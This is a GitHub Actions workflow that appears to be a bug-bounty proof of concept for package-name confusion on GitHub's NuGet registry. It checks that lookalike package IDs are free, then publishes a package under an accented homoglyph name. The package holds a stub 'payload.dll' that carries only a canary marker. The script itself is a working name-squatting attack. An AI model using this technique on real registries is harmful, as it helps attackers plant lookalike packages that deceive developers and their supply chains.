name: h1-package-name-capture
on:
  push:
    branches:
      - "h1-package-fold-*"
permissions:
  contents: read
  packages: write
jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - name: Publish one accented package with this repository's GITHUB_TOKEN
        shell: bash
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Step 1: This collaborator-controlled workflow proves three fresh names are free, then uses only its repository GITHUB_TOKEN to claim the accented spelling and embed a runner-minted canary.
          set -euo pipefail
          suffix="${GITHUB_SHA:0:6}"
          ascii_id="H1Video.Order${suffix}"
          accented_id="H1Video.Órder${suffix}"
          near_id="H1Video.Ordez${suffix}"
          canary="H1-ATTACKER-RUN-${GITHUB_RUN_ID}"

          encode() {
            python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"
          }
          check_free() {
            code=$(curl -sS -u "x:${TOKEN}" -o "precheck-$2.txt" -w '%{http_code}' \
              "https://nuget.pkg.github.com/${GITHUB_REPOSITORY_OWNER}/$(encode "$1")/index.json")
            echo "precheck_${2}=${code} $(tr -d '\n' < "precheck-$2.txt")"
            test "$code" = "404"
            sleep 2
          }

          echo "ascii_package_id=${ascii_id}"
          echo "accented_package_id=${accented_id}"
          echo "near_miss_id=${near_id}"
          echo "attacker_canary=${canary}"
          check_free "$ascii_id" ascii
          check_free "$accented_id" accented
          check_free "$near_id" near

          PACKAGE_ID="$accented_id" CANARY="$canary" python3 - <<'PY'
          import os
          import zipfile

          package_id = os.environ["PACKAGE_ID"]
          canary = os.environ["CANARY"]
          repository = os.environ["GITHUB_REPOSITORY"]
          nuspec = (
              '<?xml version="1.0" encoding="utf-8"?>'
              '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd"><metadata>'
              f'<id>{package_id}</id><version>1.0.0</version><authors>attacker-workflow</authors>'
              f'<description>{canary}, built by {repository}</description>'
              f'<repository type="git" url="https://github.com/{repository}" />'
              '</metadata></package>'
          )
          content_types = (
              '<?xml version="1.0" encoding="utf-8"?>'
              '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
              '<Default Extension="nuspec" ContentType="text/xml" />'
              '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml" />'
              '<Default Extension="dll" ContentType="application/octet-stream" /></Types>'
          )
          relationships = (
              '<?xml version="1.0" encoding="utf-8"?>'
              '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
              f'<Relationship Type="http://schemas.microsoft.com/packaging/2010/07/manifest" '
              f'Target="/{package_id}.nuspec" Id="R1" /></Relationships>'
          )
          with zipfile.ZipFile("attacker.nupkg", "w", zipfile.ZIP_DEFLATED) as archive:
              archive.writestr(package_id + ".nuspec", nuspec)
              archive.writestr("[Content_Types].xml", content_types)
              archive.writestr("_rels/.rels", relationships)
              archive.writestr("lib/netstandard2.0/payload.dll", b"MZ\x90\x00" + canary.encode())
          PY

          status=$(curl -sS -X PUT "https://nuget.pkg.github.com/${GITHUB_REPOSITORY_OWNER}/" \
            -u "x:${TOKEN}" -H "X-NuGet-ApiKey: ${TOKEN}" -H "X-NuGet-Client-Version: 6.9.1" \
            -F "package=@attacker.nupkg;type=application/octet-stream" -o publish-response.txt -w '%{http_code}')
          echo "publish_status=${status}"
          cat publish-response.txt
          test "$status" = "200"
